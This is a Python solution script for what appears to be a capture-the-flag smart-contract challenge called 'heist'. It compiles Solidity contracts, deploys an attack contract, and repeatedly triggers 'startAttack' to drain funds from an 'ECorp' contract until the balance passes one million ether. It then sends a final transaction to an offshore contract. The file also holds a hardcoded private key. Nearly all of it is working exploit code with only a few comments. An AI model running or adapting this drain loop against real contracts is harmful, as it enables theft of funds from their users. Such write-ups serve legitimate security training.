import solc
import web3
import json

USER_PRIV  = '0xaf5eea8866d3f084fb6ec7719e738eb8771170431b60ce1970c82ad0820cd145'

ECORP_CONTRACT_ADDRESS    = '0xB36f4d32522A55B6cfb038F2F19b8A3d01D104f4'
OFFSHORE_CONTRACT_ADDRESS = '0xc756a7d68424480b94cB13265d623fe39da1CfC6'

class ECorp:

    def __init__(self, w3, account, contract, address):
        self.w3 = w3
        self.account = account
        self.address = address
        self.abi = contract['abi']
        self.bin = contract['bin']
        self.contract = w3.eth.contract(
            address = self.address,
            abi = self.abi
        )

    def send_raw_tx(self, fn_name=None, args=None, ether=None):
        transaction = {
            'from': self.account.address,
            'to': self.contract.address,
            'gas': 200000,
            'gasPrice': self.w3.eth.gasPrice,
            'value': self.w3.toWei(str(ether), 'ether') if ether else 0,
            'nonce': self.w3.eth.getTransactionCount(self.account.address)
        }
        if fn_name:
            transaction['data'] = self.contract.encodeABI(fn_name, args=args)

        signed = self.account.sign_transaction(transaction)
        self.w3.eth.sendRawTransaction(signed.rawTransaction)

    def deposit(self, address_to, ether):
        wei = self.w3.toWei(str(ether), 'ether')
        self.send_raw_tx(fn_name="deposit", args=[address_to, wei], ether=ether)

    def transfer(self, address_to, ether):
        wei = self.w3.toWei(str(ether), 'ether')
        self.send_raw_tx(fn_name="transfer", args=[address_to, wei])

    def getBalance(self):
        return self.contract.functions.getBalance().call()

    def withdrawBalance(self):
        self.send_raw_tx(fn_name="withdrawBalance")

    def reset(self):
        self.send_raw_tx(fn_name="reset")

    def donate(self, ether):
        self.send_raw_tx(ether=ether)

class Exploit:

    def __init__(self, w3, account, contract, address):
        self.w3 = w3
        self.account = account
        self.address = address
        self.abi = contract['abi']
        self.bin = contract['bin']
        self.contract = w3.eth.contract(
            address = self.address,
            abi = self.abi
        )

    def send_raw_tx(self, fn_name=None, args=None, ether=None):
        transaction = {
            'from': self.account.address,
            'to': self.contract.address,
            'gas': 4950000000,
            'gasPrice': self.w3.eth.gasPrice,
            'value': self.w3.toWei(str(ether), 'ether') if ether else 0,
            'nonce': self.w3.eth.getTransactionCount(self.account.address)
        }
        if fn_name:
            transaction['data'] = self.contract.encodeABI(fn_name, args=args)

        signed = self.account.sign_transaction(transaction)
        self.w3.eth.sendRawTransaction(signed.rawTransaction)

    def exploit(self):
        self.send_raw_tx("startAttack")

def deploy_contract(w3, account, contract):
    transaction = {
        'from': account.address,
        'gas': 1000000,
        'gasPrice': w3.eth.gasPrice,
        'data': contract['bin'],
        'nonce': w3.eth.getTransactionCount(account.address)
    }

    signed = account.sign_transaction(transaction)
    tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
    return w3.eth.waitForTransactionReceipt(tx_hash)['contractAddress']

def exploit(w3, exploit_contract):
    # Deploy the attack contract
    exploit_contract_address = deploy_contract(w3, account, exploit_contract)

    # Deposit an inital amount for the attack contract
    contract = ECorp(w3, account, ecorp_contract, ECORP_CONTRACT_ADDRESS)
    contract.deposit(exploit_contract_address, 100)

    # Exploit
    exploit = Exploit(w3, account, exploit_contract, exploit_contract_address)
    exploit.exploit()

def getBalance(address):
    return w3.fromWei(w3.eth.getBalance(address), 'ether')

with \
    open("Exploit.sol", "r") as EX, \
    open("ECorp.sol", "r") as EC, \
    open("Offshore.sol", "r") as OF:
    compiled_sol = solc.compile_standard({
        "language": "Solidity",
        "sources": {
            "Exploit.sol": {
                "content": EX.read()
            },
            "ECorp.sol": {
                "content": EC.read()
            },
            "Offshore.sol": {
                "content": OF.read()
            }
        },
        "settings": {
            "outputSelection": {
                "*": {
                    "*": [
                        "metadata", "evm.bytecode"
                        , "evm.bytecode.sourceMap"
                    ]
                }
            }
        }
    })

def get_abi_bin(compiled_sol, contract_name):
    contract = compiled_sol['contracts'][f'{contract_name}.sol'][f'{contract_name}']
    contract_bin = contract['evm']['bytecode']['object']
    contract_abi = json.loads(contract['metadata'])['output']['abi']
    return {'abi': contract_abi, 'bin': contract_bin}

ecorp_contract   = get_abi_bin(compiled_sol, 'ECorp')
exploit_contract = get_abi_bin(compiled_sol, 'Exploit')
offshore_contract = get_abi_bin(compiled_sol, 'Offshore')

w3 = web3.Web3(web3.HTTPProvider(f"http://heist.ctf.cuctf.io:7600"))
account = web3.eth.Account.privateKeyToAccount(USER_PRIV)

while True:
    current_balance = getBalance(account.address)
    print(f"Current balance is: {current_balance}")
    if current_balance > 1000000:
        break
    exploit(w3, exploit_contract)

win_tx = {
    'from': account.address,
    'to': OFFSHORE_CONTRACT_ADDRESS,
    'gas': 1000000,
    'gasPrice': w3.eth.gasPrice,
    'data': w3.toHex(b'172.17.0.3:1337'),
    'value': w3.toWei('1000000', 'ether'),
    'nonce': w3.eth.getTransactionCount(account.address)
}

signed = account.sign_transaction(win_tx)
tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
